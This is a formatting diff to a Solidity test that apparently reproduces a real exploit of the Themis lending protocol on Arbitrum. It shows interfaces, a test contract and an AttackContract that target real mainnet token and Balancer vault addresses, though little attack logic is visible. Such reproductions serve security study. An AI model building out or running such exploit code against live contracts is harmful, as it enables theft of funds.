@@ -16,6 +16,7 @@ import "./../interface.sol";
 // Detailed attack steps: https://twitter.com/BlockSecTeam/status/1673897088617426946
 
 interface IThemis {
+
     function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
 
     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
@@ -27,17 +28,23 @@ interface IThemis {
         uint16 referralCode,
         address onBehalfOf
     ) external;
+
 }
 
 interface IGauge is IERC20 {
+
     function deposit(uint256 _amount, address _referrer) external;
+
 }
 
 interface IPool is IERC20 {
+
     function getPoolId() external view returns (bytes32);
+
 }
 
 contract ThemisTest is Test {
+
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 wstETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
     IERC20 DAI = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
@@ -187,9 +194,11 @@ contract ThemisTest is Test {
     }
 
     receive() external payable {}
+
 }
 
 contract AttackContract {
+
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 wstETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
     IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
@@ -262,4 +271,5 @@ contract AttackContract {
         (bool success, bytes memory retData) = address(WETH).call{value: 55 ether}(abi.encodeWithSignature("deposit()"));
         require(success, "Call not successful");
     }
+
 }
